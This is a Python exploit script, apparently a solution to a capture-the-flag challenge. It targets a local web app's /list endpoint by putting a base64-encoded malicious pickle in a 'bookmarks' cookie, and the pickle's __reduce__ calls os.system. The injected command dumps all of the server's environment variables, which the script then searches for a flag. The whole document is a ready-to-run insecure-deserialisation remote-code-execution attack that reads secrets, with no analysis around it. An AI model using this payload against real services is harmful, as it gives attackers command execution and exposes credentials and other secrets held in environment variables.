import base64
import pickle
import requests
import re

# Target URL
target_url = "http://127.0.0.1:32827/list"

# Keep the existing user cookie from authentication
user_cookie = "5fb5fa20dbac4c5cacd23ae94e1b2709"

# Create a proper malicious pickle payload for RCE
class RCE:
    def __reduce__(self):
        import os
        # Command to print environment variables with markers
        cmd = "python -c \"import os; print('===ENV_VARS_START==='); [print(f'{k}={v}') for k,v in os.environ.items()]; print('===ENV_VARS_END===')\"
        return (os.system, (cmd,))

print("[*] Generating malicious pickle payload...")
malicious_pickle_payload = base64.b64encode(pickle.dumps(RCE(), protocol=4)).decode('utf-8')
print(f"[+] Generated payload (base64): {malicious_pickle_payload[:50]}...")
print(f"[+] Payload length: {len(malicious_pickle_payload)}")

# Set up cookies
cookies = {
    "user": user_cookie,
    "bookmarks": malicious_pickle_payload
}

print(f"[*] Making GET request to {target_url}")

try:
    # Make the request
    response = requests.get(target_url, cookies=cookies, timeout=30, allow_redirects=True)
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Headers:")
    for header, value in response.headers.items():
        print(f"    {header}: {value}")
    
    print(f"\n[+] Response Body:")
    print(response.text)
    print("-" * 80)
    
    # Extract environment variables between markers
    print("[+] Searching for environment variable markers...")
    
    env_start = "===ENV_VARS_START==="
    env_end = "===ENV_VARS_END==="
    
    if env_start in response.text and env_end in response.text:
        start_idx = response.text.find(env_start) + len(env_start)
        end_idx = response.text.find(env_end)
        env_vars_section = response.text[start_idx:end_idx].strip()
        
        print(f"[+] Environment variables extracted:")
        print(env_vars_section)
        print("-" * 80)
        
        # Search for FLAG pattern in environment variables
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, env_vars_section)
        
        if flags:
            print(f"[!] FLAG FOUND: {flags[0]}")
        else:
            print("[-] No FLAG found in environment variables")
    else:
        print("[-] Environment variable markers not found in response")
    
    # Check full response for any FLAG pattern
    print("[+] Checking full response body for FLAG...")
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, response.text)
    if flags:
        print(f"[!] FLAG FOUND in response: {flags[0]}")
    else:
        print("[-] No FLAG found in response")
    
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
